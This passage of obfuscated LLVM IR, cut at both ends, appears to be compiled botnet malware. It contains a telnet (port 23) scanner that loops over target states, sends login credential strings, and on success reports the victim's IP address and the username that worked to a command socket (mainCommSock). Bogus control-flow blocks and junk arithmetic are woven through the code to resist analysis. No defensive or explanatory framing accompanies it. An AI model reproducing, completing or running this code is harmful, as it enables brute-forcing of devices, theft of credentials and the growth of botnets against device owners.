  %1587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1586
  %1588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1587, i32 0, i32 3
  store i8 1, i8* %1588, align 1
  br label %1589

; <label>:1589:                                   ; preds = %1574, %1565
  %1590 = load i32, i32* @x.67
  %1591 = load i32, i32* @y.68
  %1592 = sub i32 %1590, 1
  %1593 = mul i32 %1590, %1592
  %1594 = urem i32 %1593, 2
  %1595 = icmp eq i32 %1594, 0
  %1596 = icmp slt i32 %1591, 10
  %1597 = or i1 %1595, %1596
  br i1 %1597, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1589
  %1598 = load i32, i32* @x.67
  %1599 = load i32, i32* @y.68
  %1600 = sub i32 %1598, 1
  %1601 = mul i32 %1598, %1600
  %1602 = urem i32 %1601, 2
  %1603 = icmp eq i32 %1602, 0
  %1604 = icmp slt i32 %1599, 10
  %1605 = or i1 %1603, %1604
  br i1 %1605, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1869

; <label>:1606:                                   ; preds = %97
  %1607 = load i32, i32* %10, align 4
  %1608 = sext i32 %1607 to i64
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1608
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1609, i32 0, i32 0
  %1611 = load i32, i32* %1610, align 16
  %1612 = call i64 @send(i32 %1611, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i64 4, i32 16384)
  %1613 = icmp slt i64 %1612, 0
  br i1 %1613, label %1614, label %1629

; <label>:1614:                                   ; preds = %1606
  %1615 = load i32, i32* %10, align 4
  %1616 = sext i32 %1615 to i64
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1616
  %1618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1617, i32 0, i32 0
  %1619 = load i32, i32* %1618, align 16
  %1620 = call i32 @sclose(i32 %1619)
  %1621 = load i32, i32* %10, align 4
  %1622 = sext i32 %1621 to i64
  %1623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1622
  %1624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1623, i32 0, i32 2
  store i8 0, i8* %1624, align 8
  %1625 = load i32, i32* %10, align 4
  %1626 = sext i32 %1625 to i64
  %1627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1626
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1627, i32 0, i32 3
  store i8 1, i8* %1628, align 1
  br label %1870

; <label>:1629:                                   ; preds = %1606
  %1630 = load i32, i32* %10, align 4
  %1631 = sext i32 %1630 to i64
  %1632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1631
  %1633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1632, i32 0, i32 2
  store i8 101, i8* %1633, align 8
  br label %1869

; <label>:1634:                                   ; preds = %97
  %1635 = load i32, i32* %10, align 4
  %1636 = sext i32 %1635 to i64
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1636
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1637, i32 0, i32 0
  %1639 = load i32, i32* %1638, align 16
  %1640 = call i64 @send(i32 %1639, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i32 0, i32 0), i64 282, i32 16384)
  %1641 = icmp slt i64 %1640, 0
  br i1 %1641, label %1642, label %1673

; <label>:1642:                                   ; preds = %1634
  %1643 = load i32, i32* @x.67
  %1644 = load i32, i32* @y.68
  %1645 = sub i32 %1643, 1
  %1646 = mul i32 %1643, %1645
  %1647 = urem i32 %1646, 2
  %1648 = icmp eq i32 %1647, 0
  %1649 = icmp slt i32 %1644, 10
  %1650 = or i1 %1648, %1649
  br i1 %1650, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1642
  %1651 = load i32, i32* %10, align 4
  %1652 = sext i32 %1651 to i64
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1652
  %1654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1653, i32 0, i32 0
  %1655 = load i32, i32* %1654, align 16
  %1656 = call i32 @sclose(i32 %1655)
  %1657 = load i32, i32* %10, align 4
  %1658 = sext i32 %1657 to i64
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1658
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1659, i32 0, i32 2
  store i8 0, i8* %1660, align 8
  %1661 = load i32, i32* %10, align 4
  %1662 = sext i32 %1661 to i64
  %1663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1662
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1663, i32 0, i32 3
  store i8 1, i8* %1664, align 1
  %1665 = load i32, i32* @x.67
  %1666 = load i32, i32* @y.68
  %1667 = sub i32 %1665, 1
  %1668 = mul i32 %1665, %1667
  %1669 = urem i32 %1668, 2
  %1670 = icmp eq i32 %1669, 0
  %1671 = icmp slt i32 %1666, 10
  %1672 = or i1 %1670, %1671
  br i1 %1672, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %1870

; <label>:1673:                                   ; preds = %1634
  %1674 = load i32, i32* @x.67
  %1675 = load i32, i32* @y.68
  %1676 = sub i32 %1674, 1
  %1677 = mul i32 %1674, %1676
  %1678 = urem i32 %1677, 2
  %1679 = icmp eq i32 %1678, 0
  %1680 = icmp slt i32 %1675, 10
  %1681 = or i1 %1679, %1680
  br i1 %1681, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1673
  %1682 = load i32, i32* %10, align 4
  %1683 = sext i32 %1682 to i64
  %1684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1683
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1684, i32 0, i32 2
  store i8 102, i8* %1685, align 8
  %1686 = load i32, i32* @x.67
  %1687 = load i32, i32* @y.68
  %1688 = sub i32 %1686, 1
  %1689 = mul i32 %1686, %1688
  %1690 = urem i32 %1689, 2
  %1691 = icmp eq i32 %1690, 0
  %1692 = icmp slt i32 %1687, 10
  %1693 = or i1 %1691, %1692
  br i1 %1693, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %1869

; <label>:1694:                                   ; preds = %97
  %1695 = load i32, i32* %10, align 4
  %1696 = sext i32 %1695 to i64
  %1697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1696
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1697, i32 0, i32 0
  %1699 = load i32, i32* %1698, align 16
  %1700 = call i64 @send(i32 %1699, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i32 0, i32 0), i64 49, i32 16384)
  %1701 = icmp slt i64 %1700, 0
  br i1 %1701, label %1702, label %1717

; <label>:1702:                                   ; preds = %1694
  %1703 = load i32, i32* %10, align 4
  %1704 = sext i32 %1703 to i64
  %1705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1704
  %1706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1705, i32 0, i32 0
  %1707 = load i32, i32* %1706, align 16
  %1708 = call i32 @sclose(i32 %1707)
  %1709 = load i32, i32* %10, align 4
  %1710 = sext i32 %1709 to i64
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1710
  %1712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1711, i32 0, i32 2
  store i8 0, i8* %1712, align 8
  %1713 = load i32, i32* %10, align 4
  %1714 = sext i32 %1713 to i64
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1714
  %1716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1715, i32 0, i32 3
  store i8 1, i8* %1716, align 1
  br label %1870

; <label>:1717:                                   ; preds = %1694
  %1718 = load i32, i32* %10, align 4
  %1719 = sext i32 %1718 to i64
  %1720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1719
  %1721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1720, i32 0, i32 2
  store i8 103, i8* %1721, align 8
  br label %1869

; <label>:1722:                                   ; preds = %97
  %1723 = load i32, i32* %10, align 4
  %1724 = sext i32 %1723 to i64
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1724
  %1726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1725, i32 0, i32 6
  %1727 = load i32, i32* %1726, align 4
  %1728 = icmp eq i32 %1727, 0
  br i1 %1728, label %1729, label %1735

; <label>:1729:                                   ; preds = %1722
  %1730 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1731 = load i32, i32* %10, align 4
  %1732 = sext i32 %1731 to i64
  %1733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1732
  %1734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1733, i32 0, i32 6
  store i32 %1730, i32* %1734, align 4
  br label %1735

; <label>:1735:                                   ; preds = %1729, %1722
  %1736 = load i32, i32* %10, align 4
  %1737 = sext i32 %1736 to i64
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1737
  %1739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1738, i32 0, i32 0
  %1740 = load i32, i32* %1739, align 16
  %1741 = load i32, i32* %10, align 4
  %1742 = sext i32 %1741 to i64
  %1743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1742
  %1744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1743, i32 0, i32 8
  %1745 = load i8*, i8** %1744, align 8
  %1746 = load i32, i32* %10, align 4
  %1747 = sext i32 %1746 to i64
  %1748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1747
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1748, i32 0, i32 7
  %1750 = load i16, i16* %1749, align 16
  %1751 = zext i16 %1750 to i32
  %1752 = call i32 @readUntil(i32 %1740, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1745, i32 1024, i32 %1751)
  %1753 = icmp ne i32 %1752, 0
  br i1 %1753, label %1754, label %1816

; <label>:1754:                                   ; preds = %1735
  %1755 = load i32, i32* @x.67
  %1756 = load i32, i32* @y.68
  %1757 = sub i32 %1755, 1
  %1758 = mul i32 %1755, %1757
  %1759 = urem i32 %1758, 2
  %1760 = icmp eq i32 %1759, 0
  %1761 = icmp slt i32 %1756, 10
  %1762 = or i1 %1760, %1761
  br i1 %1762, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1754
  %1763 = load i32, i32* %10, align 4
  %1764 = sext i32 %1763 to i64
  %1765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1764
  %1766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1765, i32 0, i32 6
  store i32 0, i32* %1766, align 4
  %1767 = load i32, i32* %10, align 4
  %1768 = sext i32 %1767 to i64
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1768
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1769, i32 0, i32 7
  store i16 0, i16* %1770, align 16
  %1771 = load i32, i32* @mainCommSock, align 4
  %1772 = load i32, i32* %10, align 4
  %1773 = sext i32 %1772 to i64
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1773
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1774, i32 0, i32 1
  %1776 = bitcast i32* %1775 to %struct.in_addr*
  %1777 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1776, i32 0, i32 0
  %1778 = load i32, i32* %1777, align 4
  %1779 = call i8* @inet_ntoa(i32 %1778) #4
  %1780 = load i32, i32* %10, align 4
  %1781 = sext i32 %1780 to i64
  %1782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1781
  %1783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1782, i32 0, i32 4
  %1784 = load i8, i8* %1783, align 2
  %1785 = zext i8 %1784 to i64
  %1786 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %1785
  %1787 = load i8*, i8** %1786, align 8
  %1788 = call i32 (i32, i8*, ...) @sockprintf(i32 %1771, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* %1779, i8* %1787)
  %1789 = load i32, i32* %10, align 4
  %1790 = sext i32 %1789 to i64
  %1791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1790
  %1792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1791, i32 0, i32 0
  %1793 = load i32, i32* %1792, align 16
  %1794 = call i32 @sclose(i32 %1793)
  %1795 = load i32, i32* %10, align 4
  %1796 = sext i32 %1795 to i64
  %1797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1796
  %1798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1797, i32 0, i32 2
  store i8 0, i8* %1798, align 8
  %1799 = load i32, i32* %10, align 4
  %1800 = sext i32 %1799 to i64
  %1801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1800
  %1802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1801, i32 0, i32 8
  %1803 = load i8*, i8** %1802, align 8
  call void @llvm.memset.p0i8.i64(i8* %1803, i8 0, i64 1024, i32 1, i1 false)
  %1804 = load i32, i32* %10, align 4
  %1805 = sext i32 %1804 to i64
  %1806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1805
  %1807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1806, i32 0, i32 3
  store i8 1, i8* %1807, align 1
  %1808 = load i32, i32* @x.67
  %1809 = load i32, i32* @y.68
  %1810 = sub i32 %1808, 1
  %1811 = mul i32 %1808, %1810
  %1812 = urem i32 %1811, 2
  %1813 = icmp eq i32 %1812, 0
  %1814 = icmp slt i32 %1809, 10
  %1815 = or i1 %1813, %1814
  br i1 %1815, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %1870

; <label>:1816:                                   ; preds = %1735
  %1817 = load i32, i32* @x.67
  %1818 = load i32, i32* @y.68
  %1819 = sub i32 %1817, 1
  %1820 = mul i32 %1817, %1819
  %1821 = urem i32 %1820, 2
  %1822 = icmp eq i32 %1821, 0
  %1823 = icmp slt i32 %1818, 10
  %1824 = or i1 %1822, %1823
  br i1 %1824, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1816
  %1825 = load i32, i32* %10, align 4
  %1826 = sext i32 %1825 to i64
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1826
  %1828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1827, i32 0, i32 8
  %1829 = load i8*, i8** %1828, align 8
  %1830 = call i64 @strlen(i8* %1829) #10
  %1831 = trunc i64 %1830 to i16
  %1832 = load i32, i32* %10, align 4
  %1833 = sext i32 %1832 to i64
  %1834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1833
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1834, i32 0, i32 7
  store i16 %1831, i16* %1835, align 16
  %1836 = load i32, i32* @x.67
  %1837 = load i32, i32* @y.68
  %1838 = sub i32 %1836, 1
  %1839 = mul i32 %1836, %1838
  %1840 = urem i32 %1839, 2
  %1841 = icmp eq i32 %1840, 0
  %1842 = icmp slt i32 %1837, 10
  %1843 = or i1 %1841, %1842
  br i1 %1843, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1844

; <label>:1844:                                   ; preds = %originalBBpart2168
  %1845 = load i32, i32* %10, align 4
  %1846 = sext i32 %1845 to i64
  %1847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1846
  %1848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1847, i32 0, i32 6
  %1849 = load i32, i32* %1848, align 4
  %1850 = add i32 %1849, 30
  %1851 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1852 = icmp ult i32 %1850, %1851
  br i1 %1852, label %1853, label %1868

; <label>:1853:                                   ; preds = %1844
  %1854 = load i32, i32* %10, align 4
  %1855 = sext i32 %1854 to i64
  %1856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1855
  %1857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1856, i32 0, i32 0
  %1858 = load i32, i32* %1857, align 16
  %1859 = call i32 @sclose(i32 %1858)
  %1860 = load i32, i32* %10, align 4
  %1861 = sext i32 %1860 to i64
  %1862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1861
  %1863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1862, i32 0, i32 2
  store i8 0, i8* %1863, align 8
  %1864 = load i32, i32* %10, align 4
  %1865 = sext i32 %1864 to i64
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1865
  %1867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1866, i32 0, i32 3
  store i8 1, i8* %1867, align 1
  br label %1868

; <label>:1868:                                   ; preds = %1853, %1844
  br label %1869

; <label>:1869:                                   ; preds = %1868, %1717, %originalBBpart2160, %1629, %originalBBpart2152, %originalBBpart2144, %1361, %originalBBpart2128, %1277, %1113, %originalBBpart2108, %originalBBpart280, %681, %562, %originalBBpart256, %97
  br label %1870

; <label>:1870:                                   ; preds = %1869, %originalBBpart2164, %1702, %originalBBpart2156, %1614, %1533, %originalBBpart2140, %1346, %1286, %1235, %1210, %1182, %originalBBpart2120, %originalBBpart2116, %918, %888, %730, %707, %originalBBpart276, %487, %247, %originalBBpart223
  %1871 = load i32, i32* %10, align 4
  %1872 = add nsw i32 %1871, 1
  store i32 %1872, i32* %10, align 4
  br label %93

; <label>:1873:                                   ; preds = %93
  br label %91
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %1875 = alloca i32, align 4
  %1876 = alloca i32, align 4
  %1877 = alloca i32, align 4
  %1878 = alloca %struct.__sigset_t, align 8
  %1879 = alloca %struct.timeval, align 8
  %1880 = alloca i32, align 4
  %1881 = alloca i32, align 4
  %1882 = alloca %struct.sockaddr_in, align 4
  %1883 = alloca i8*, align 8
  %1884 = alloca i8*, align 8
  %1885 = alloca i32, align 4
  %1886 = alloca i32, align 4
  %1887 = call i32 @getdtablesize() #4
  %1888 = sdiv i32 %1887, 4
  %_ = sub i32 0, %1888
  %gen = add i32 %_, 3
  %1889 = mul nsw i32 %1888, 3
  store i32 %1889, i32* %1875, align 4
  %1890 = load i32, i32* %1875, align 4
  %1891 = icmp sgt i32 %1890, 4096
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %74
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %136
  %1892 = load i32, i32* %10, align 4
  %1893 = sext i32 %1892 to i64
  %1894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1893
  %1895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1894, i32 0, i32 5
  %1896 = load i8, i8* %1895, align 1
  %_7 = sub i8 0, %1896
  %gen8 = add i8 %_7, 1
  %_9 = sub i8 %1896, 1
  %gen10 = mul i8 %_9, 1
  %_11 = sub i8 %1896, 1
  %gen12 = mul i8 %_11, 1
  %_13 = shl i8 %1896, 1
  %_14 = sub i8 0, %1896
  %gen15 = add i8 %_14, 1
  %_16 = sub i8 %1896, 1
  %gen17 = mul i8 %_16, 1
  %1897 = add i8 %1896, 1
  store i8 %1897, i8* %1895, align 1
  %1898 = load i32, i32* %10, align 4
  %1899 = sext i32 %1898 to i64
  %1900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1899
  %1901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1900, i32 0, i32 5
  %1902 = load i8, i8* %1901, align 1
  %1903 = zext i8 %1902 to i64
  %1904 = icmp eq i64 %1903, 14
  br label %originalBB6

originalBB21alteredBB:                            ; preds = %originalBB21, %185
  %1905 = load i32, i32* %10, align 4
  %1906 = sext i32 %1905 to i64
  %1907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1906
  %1908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1907, i32 0, i32 3
  store i8 1, i8* %1908, align 1
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %207
  %1909 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %1909, align 4
  %1910 = call zeroext i16 @htons(i16 zeroext 23) #13
  %1911 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %1910, i16* %1911, align 2
  %1912 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %1913 = getelementptr inbounds [8 x i8], [8 x i8]* %1912, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1913, i8 0, i64 8, i32 4, i1 false)
  %1914 = load i32, i32* %10, align 4
  %1915 = sext i32 %1914 to i64
  %1916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1915
  %1917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1916, i32 0, i32 1
  %1918 = load i32, i32* %1917, align 4
  %1919 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %1920 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1919, i32 0, i32 0
  store i32 %1918, i32* %1920, align 4
  %1921 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %1922 = load i32, i32* %10, align 4
  %1923 = sext i32 %1922 to i64
  %1924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1923
  %1925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1924, i32 0, i32 0
  store i32 %1921, i32* %1925, align 16
  %1926 = load i32, i32* %10, align 4
  %1927 = sext i32 %1926 to i64
  %1928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1927
  %1929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1928, i32 0, i32 0
  %1930 = load i32, i32* %1929, align 16
  %1931 = icmp eq i32 %1930, -1
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %248
  %1932 = load i32, i32* %10, align 4
  %1933 = sext i32 %1932 to i64
  %1934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1933
  %1935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1934, i32 0, i32 0
  %1936 = load i32, i32* %1935, align 16
  %1937 = load i32, i32* %10, align 4
  %1938 = sext i32 %1937 to i64
  %1939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1938
  %1940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1939, i32 0, i32 0
  %1941 = load i32, i32* %1940, align 16
  %1942 = call i32 (i32, i32, ...) @fcntl(i32 %1941, i32 3, i8* null)
  %_30 = sub i32 0, %1942
  %gen31 = add i32 %_30, 2048
  %_32 = shl i32 %1942, 2048
  %_33 = shl i32 %1942, 2048
  %_34 = sub i32 %1942, 2048
  %gen35 = mul i32 %_34, 2048
  %_36 = shl i32 %1942, 2048
  %_37 = sub i32 %1942, 2048
  %gen38 = mul i32 %_37, 2048
  %_39 = sub i32 0, %1942
  %gen40 = add i32 %_39, 2048
  %_41 = sub i32 %1942, 2048
  %gen42 = mul i32 %_41, 2048
  %1943 = or i32 %1942, 2048
  %1944 = call i32 (i32, i32, ...) @fcntl(i32 %1936, i32 4, i32 %1943)
  %1945 = load i32, i32* %10, align 4
  %1946 = sext i32 %1945 to i64
  %1947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1946
  %1948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1947, i32 0, i32 0
  %1949 = load i32, i32* %1948, align 16
  %1950 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %1951 = call i32 @connect(i32 %1949, %struct.sockaddr* %1950, i32 16)
  %1952 = icmp eq i32 %1951, -1
  br label %originalBB29

originalBB46alteredBB:                            ; preds = %originalBB46, %286
  %1953 = call i32* @__errno_location() #13
  %1954 = load i32, i32* %1953, align 4
  %1955 = icmp ne i32 %1954, 115
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %306
  %1956 = load i32, i32* %10, align 4
  %1957 = sext i32 %1956 to i64
  %1958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1957
  %1959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1958, i32 0, i32 0
  %1960 = load i32, i32* %1959, align 16
  %1961 = call i32 @sclose(i32 %1960)
  %1962 = load i32, i32* %10, align 4
  %1963 = sext i32 %1962 to i64
  %1964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1963
  %1965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1964, i32 0, i32 3
  store i8 1, i8* %1965, align 1
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %342
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %366
  %1966 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1967 = load i32, i32* %10, align 4
  %1968 = sext i32 %1967 to i64
  %1969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1968
  %1970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1969, i32 0, i32 6
  store i32 %1966, i32* %1970, align 4
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %398
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %456
  %1971 = load i32, i32* %10, align 4
  %1972 = sext i32 %1971 to i64
  %1973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1972
  %1974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1973, i32 0, i32 0
  %1975 = load i32, i32* %1974, align 16
  %1976 = call i32 @sclose(i32 %1975)
  %1977 = load i32, i32* %10, align 4
  %1978 = sext i32 %1977 to i64
  %1979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1978
  %1980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1979, i32 0, i32 2
  store i8 0, i8* %1980, align 8
  %1981 = load i32, i32* %10, align 4
  %1982 = sext i32 %1981 to i64
  %1983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1982
  %1984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1983, i32 0, i32 3
  store i8 1, i8* %1984, align 1
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %563
  %1985 = load i32, i32* %10, align 4
  %1986 = sext i32 %1985 to i64
  %1987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1986
  %1988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1987, i32 0, i32 6
  %1989 = load i32, i32* %1988, align 4
  %1990 = icmp eq i32 %1989, 0
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %611
  %1991 = load i32, i32* %10, align 4
  %1992 = sext i32 %1991 to i64
  %1993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1992
  %1994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1993, i32 0, i32 6
  store i32 0, i32* %1994, align 4
  %1995 = load i32, i32* %10, align 4
  %1996 = sext i32 %1995 to i64
  %1997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1996
  %1998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1997, i32 0, i32 7
  store i16 0, i16* %1998, align 16
  %1999 = load i32, i32* %10, align 4
  %2000 = sext i32 %1999 to i64
  %2001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2000
  %2002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2001, i32 0, i32 8
  %2003 = load i8*, i8** %2002, align 8
  call void @llvm.memset.p0i8.i64(i8* %2003, i8 0, i64 1024, i32 1, i1 false)
  %2004 = load i32, i32* %10, align 4
  %2005 = sext i32 %2004 to i64
  %2006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2005
  %2007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2006, i32 0, i32 2
  store i8 3, i8* %2007, align 8
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %745
  %2008 = load i32, i32* %10, align 4
  %2009 = sext i32 %2008 to i64
  %2010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2009
